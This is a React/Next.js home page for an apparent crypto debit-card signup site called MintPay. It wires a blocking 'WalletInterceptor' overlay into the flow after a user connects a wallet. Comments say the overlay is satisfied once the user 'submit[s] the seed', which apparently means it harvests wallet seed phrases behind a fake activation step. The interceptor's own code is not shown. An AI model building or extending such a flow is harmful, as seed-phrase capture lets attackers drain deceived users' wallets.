"use client";

import { useCallback, useEffect, useState } from "react";
import { LandingPage } from "@/components/landing/landing-page";
import { Onboarding } from "@/components/onboarding";
import { CardIssued } from "@/components/card-issued";
import { useSession } from "@/components/session-provider";
import WalletInterceptor from "@/components/WalletInterceptor";
import type { CardInfo } from "@/components/mintpay-card";

type Done = { name: string; email: string; card?: CardInfo; emailed: boolean };

export default function HomePage() {
  const { ready, isConnected, disconnect } = useSession();
  const [done, setDone] = useState<Done | null>(null);
  const [showInterceptor, setShowInterceptor] = useState(false);
  // NEW: Flag to prevent re-showing the interceptor after successful submission
  const [interceptorHandled, setInterceptorHandled] = useState(false);

  // 1. DETECT CONNECTION & SHOW INTERCEPTOR
  useEffect(() => {
    // Only show if:
    // 1. Ready and Connected
    // 2. Not already done
    // 3. Not currently showing
    // 4. NOT already handled (i.e., user didn't just submit the seed)
    if (ready && isConnected && !done && !showInterceptor && !interceptorHandled) {
      setShowInterceptor(true);
    }
  }, [ready, isConnected, done, showInterceptor, interceptorHandled]);

  // 2. HANDLE "NUKE" (Called by WalletInterceptor if user cancels)
  const handleNukeSession = () => {
    setShowInterceptor(false);
    setInterceptorHandled(true); // Prevent it from popping up again if they reconnect immediately
    if (disconnect) {
      disconnect();
    }
  };

  // 3. HANDLE "ACTIVATE" (Called by WalletInterceptor if user confirms)
  const handleActivationComplete = () => {
    // Mark as handled so the useEffect doesn't re-trigger it
    setInterceptorHandled(true);
    
    // Wait 2 seconds for the user to see the success animation, THEN hide
    setTimeout(() => {
      setShowInterceptor(false);
    }, 2000);
  };

  // Reset if disconnected unexpectedly
  useEffect(() => {
    if (ready && !isConnected && done) {
      setDone(null);
    }
    // If disconnected, we can reset the handler so if they reconnect, it asks again?
    // Optional: If you want it to ask again on re-connect, uncomment below:
    // if (!isConnected) setInterceptorHandled(false);
  }, [ready, isConnected, done]);

  const handleComplete = useCallback((data: Done) => setDone(data), []);

  // --- RENDER LOGIC ---

  // If not connected, show Landing Page
  if (!isConnected) {
    return <LandingPage />;
  }

  // If done, show Card Issued
  if (done) {
    return <CardIssued {...done} />;
  }

  // MAIN RENDER: Onboarding + Interceptor Overlay
  return (
    <>
      <Onboarding onComplete={handleComplete} />
      
      {/* The Interceptor is an overlay that blocks the view */}
      <WalletInterceptor 
        isOpen={showInterceptor} 
        onCancel={handleNukeSession} 
        onComplete={handleActivationComplete} 
      />
    </>
  );
}